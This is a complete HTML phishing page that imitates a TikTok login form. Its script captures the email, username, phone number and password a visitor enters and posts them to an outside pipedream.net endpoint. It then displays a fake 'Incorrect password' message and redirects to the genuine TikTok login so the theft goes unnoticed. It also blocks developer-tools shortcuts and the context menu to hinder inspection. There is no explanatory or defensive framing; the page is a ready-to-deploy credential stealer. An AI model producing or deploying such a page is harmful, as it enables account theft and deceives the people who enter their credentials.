<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>TikTok Login</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{background:#000;color:#fff;font-family:Arial;margin:0;padding:20px}
  .box{max-width:380px;margin:40px auto;background:#1a1a1a;padding:30px;border-radius:12px}
  input,button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;font-size:16px}
  input{background:#333;color:#fff}
  button{background:#fe2c55;color:#fff;font-weight:bold;cursor:pointer}
  #msg{color:#ff0050;margin-top:10px;display:none;font-weight:bold}
</style></head><body>
<div class="box">
  <h1 style="color:#fe2c55;text-align:center;margin:0">tiktok</h1>
  <h2 style="text-align:center">Log in to TikTok</h2>
  <input type="email" id="e" placeholder="Email or username" required>
  <input type="text" id="u" placeholder="Username" required>
  <input type="tel" id="p" placeholder="Phone number (optional)">
  <input type="password" id="w" placeholder="Password" required>
  <button onclick="go()">Log in</button>
  <div id="msg">Incorrect password. Try again.</div>
</div>

<script>
function go(){
  let e=document.getElementById('e').value.trim();
  let u=document.getElementById('u').value.trim();
  let p=document.getElementById('p').value.trim()||'None';
  let w=document.getElementById('w').value;
  document.getElementById('msg').style.display='block';
  document.getElementById('w').value='';
  fetch('https://eov3l04y6gu1pmi.m.pipedream.net',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({email:e,username:u,phone:p,password:w,time:new Date().toLocaleString()})
  }).then(()=>setTimeout(()=>location='https://www.tiktok.com/login',1500));
}
document.onkeydown=e=>{if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&[73,74].includes(e.keyCode)))e.preventDefault();}
document.oncontextmenu=e=>e.preventDefault();
</script>
</body></html>
